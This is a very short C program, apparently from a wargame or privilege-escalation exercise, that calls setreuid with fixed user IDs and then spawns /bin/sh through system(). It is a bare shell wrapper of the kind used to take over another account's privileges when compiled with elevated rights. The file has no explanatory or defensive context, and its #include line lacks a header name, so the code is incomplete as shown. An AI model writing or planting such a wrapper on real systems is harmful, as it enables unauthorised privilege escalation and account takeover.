
#include
int main () {

        setreuid (3410, 0143);
        system ("/bin/sh");

        return 0;
}
